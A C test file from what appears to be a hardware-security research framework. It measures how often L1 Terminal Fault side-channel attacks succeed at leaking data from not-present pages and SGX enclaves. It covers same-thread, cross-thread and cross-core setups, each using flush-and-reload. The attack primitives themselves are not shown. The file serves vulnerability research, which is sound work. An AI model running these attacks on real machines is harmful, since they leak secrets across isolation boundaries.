#include "enclyser/app/l1tf.h"

#pragma region l1tf

TestSuite(l1tf, .init = construct_app_environment,
          .fini = destruct_app_environment, .disabled = true);

#pragma region l1tf_st_nosgx

int fn_l1tf_st_nosgx(char *extra_settings) {
  // SET CPU AFFINITY
  int core = 1;
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET((size_t)core, &cpuset);
  ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    app_attack_spec.offset = offset;
    for (int i = 0; i < REPETITION_TIME; i++) {
      fill_lfb(app_filling_sequence, &app_attacking_buffer);
      flush_buffer(&app_encoding_buffer);
      attack(&app_attack_spec, &app_attacking_buffer, &app_encoding_buffer);
      reload(&app_encoding_buffer, &app_printing_buffer);
    }
    accum += app_printing_buffer.buffer[offset + app_attacking_buffer.value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("L1TF ST NOSGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(l1tf, l1tf_st_nosgx, .disabled = false) {
  app_attack_spec.major = ATTACK_MAJOR_L1TF;
  app_attack_spec.minor = ATTACK_MINOR_STABLE;

  app_attacking_buffer.value = 0x1;
  app_attacking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
  assign_buffer(&app_attacking_buffer);
  
  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_l1tf_st_nosgx("GP_LOAD 0x1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_l1tf_st_nosgx("GP_STORE 0x1") == 0, );

  app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_l1tf_st_nosgx("NT_LOAD 0x1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_l1tf_st_nosgx("NT_STORE 0x1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_l1tf_st_nosgx("STR_LOAD 0x1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_l1tf_st_nosgx("STR_STORE 0x1") == 0);
}

#pragma endregion

#pragma region l1tf_st_sgx

int fn_l1tf_st_sgx(char *extra_settings) {
  // SET CPU AFFINITY
  int core = 1;
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET((size_t)core, &cpuset);
  ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    app_attack_spec.offset = offset;
    for (int i = 0; i < REPETITION_TIME; i++) {
      ecall_fill_lfb(global_eid, app_filling_sequence, &encalve_secret_buffer);
      flush_buffer(&app_encoding_buffer);
      attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
      reload(&app_encoding_buffer, &app_printing_buffer);
    }
    accum += app_printing_buffer.buffer[offset + encalve_secret_buffer.value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("L1TF ST SGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(l1tf, l1tf_st_sgx, .disabled = false) {
  app_attack_spec.major = ATTACK_MAJOR_L1TF;
  app_attack_spec.minor = ATTACK_MINOR_STABLE;

  encalve_secret_buffer.value = 0x21;
  encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
  ecall_assign_secret(global_eid, &encalve_secret_buffer);
  
  encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&encalve_secret_buffer);

  app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_l1tf_st_sgx("GP_LOAD 0x21") == 0);

  app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_l1tf_st_sgx("GP_STORE 0x21") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_l1tf_st_sgx("NT_LOAD 0x21") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_l1tf_st_sgx("NT_STORE 0x21") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_l1tf_st_sgx("STR_LOAD 0x21") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_l1tf_st_sgx("STR_STORE 0x21") == 0);
}

#pragma endregion

#pragma region l1tf_ct_nosgx

void *victhrd_l1tf_ct_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    fill_lfb(app_filling_sequence, &app_attacking_buffer);
  }

  return NULL;
}

void *attthrd_l1tf_ct_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&app_attack_spec, &app_attacking_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_l1tf_ct_nosgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + app_sysinfo.nr_cores;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    app_attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_l1tf_ct_nosgx, NULL));
    ASSERT(
        !pthread_create(&adversary_thread, NULL, attthrd_l1tf_ct_nosgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + app_attacking_buffer.value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("L1TF CT NOSGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(l1tf, l1tf_ct_nosgx, .disabled = false) {
  app_attack_spec.major = ATTACK_MAJOR_L1TF;
  app_attack_spec.minor = ATTACK_MINOR_STABLE;

  app_attacking_buffer.value = 0x41;
  app_attacking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
  assign_buffer(&app_attacking_buffer);
  
  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_l1tf_ct_nosgx("GP_LOAD 0x41") == 0);

  app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_l1tf_ct_nosgx("GP_STORE 0x41") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_l1tf_ct_nosgx("NT_LOAD 0x41") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_l1tf_ct_nosgx("NT_STORE 0x41") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_l1tf_ct_nosgx("STR_LOAD 0x41") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_l1tf_ct_nosgx("STR_STORE 0x41") == 0);
}

#pragma endregion

#pragma region l1tf_ct_sgx

void *victhrd_l1tf_ct_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    ecall_fill_lfb(global_eid, app_filling_sequence, &encalve_secret_buffer);
  }

  return NULL;
}

void *attthrd_l1tf_ct_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_l1tf_ct_sgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + app_sysinfo.nr_cores;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    app_attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_l1tf_ct_sgx, NULL));
    ASSERT(!pthread_create(&adversary_thread, NULL, attthrd_l1tf_ct_sgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + encalve_secret_buffer.value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("L1TF CT SGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(l1tf, l1tf_ct_sgx, .disabled = false) {
  app_attack_spec.major = ATTACK_MAJOR_L1TF;
  app_attack_spec.minor = ATTACK_MINOR_STABLE;

  encalve_secret_buffer.value = 0x61;
  encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
  ecall_assign_secret(global_eid, &encalve_secret_buffer);
  
  encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&encalve_secret_buffer);

  app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_l1tf_ct_sgx("GP_LOAD 0x61") == 0);

  app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_l1tf_ct_sgx("GP_STORE 0x61") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_l1tf_ct_sgx("NT_LOAD 0x61") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_l1tf_ct_sgx("NT_STORE 0x61") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_l1tf_ct_sgx("STR_LOAD 0x61") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_l1tf_ct_sgx("STR_STORE 0x61") == 0);
}

#pragma endregion

#pragma region l1tf_cc_nosgx

void *victhrd_l1tf_cc_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    fill_lfb(app_filling_sequence, &app_attacking_buffer);
  }

  return NULL;
}

void *attthrd_l1tf_cc_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&app_attack_spec, &app_attacking_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_l1tf_cc_nosgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + app_sysinfo.nr_cores - 1;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    app_attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_l1tf_cc_nosgx, NULL));
    ASSERT(
        !pthread_create(&adversary_thread, NULL, attthrd_l1tf_cc_nosgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + app_attacking_buffer.value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("L1TF CC NOSGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(l1tf, l1tf_cc_nosgx, .disabled = false) {
  app_attack_spec.major = ATTACK_MAJOR_L1TF;
  app_attack_spec.minor = ATTACK_MINOR_STABLE;

  app_attacking_buffer.value = 0x81;
  app_attacking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
  assign_buffer(&app_attacking_buffer);
  
  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_l1tf_cc_nosgx("GP_LOAD 0x81") == 0);

  app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_l1tf_cc_nosgx("GP_STORE 0x81") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_l1tf_cc_nosgx("NT_LOAD 0x81") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_l1tf_cc_nosgx("NT_STORE 0x81") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_l1tf_cc_nosgx("STR_LOAD 0x81") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_l1tf_cc_nosgx("STR_STORE 0x81") == 0);
}

#pragma endregion

#pragma region l1tf_cc_sgx

void *victhrd_l1tf_cc_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    ecall_fill_lfb(global_eid, app_filling_sequence, &encalve_secret_buffer);
  }

  return NULL;
}

void *attthrd_l1tf_cc_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNUSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_l1tf_cc_sgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + app_sysinfo.nr_cores - 1;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    app_attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_l1tf_cc_sgx, NULL));
    ASSERT(!pthread_create(&adversary_thread, NULL, attthrd_l1tf_cc_sgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + encalve_secret_buffer.value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("L1TF CC SGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(l1tf, l1tf_cc_sgx, .disabled = false) {
  app_attack_spec.major = ATTACK_MAJOR_L1TF;
  app_attack_spec.minor = ATTACK_MINOR_STABLE;

  encalve_secret_buffer.value = 0xa1;
  encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
  ecall_assign_secret(global_eid, &encalve_secret_buffer);
  
  encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&encalve_secret_buffer);

  app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_l1tf_cc_sgx("GP_LOAD 0xa1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_l1tf_cc_sgx("GP_STORE 0xa1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_l1tf_cc_sgx("NT_LOAD 0xa1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_l1tf_cc_sgx("NT_STORE 0xa1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_l1tf_cc_sgx("STR_LOAD 0xa1") == 0);

  app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_l1tf_cc_sgx("STR_STORE 0xa1") == 0);
}

#pragma endregion

#pragma endregion
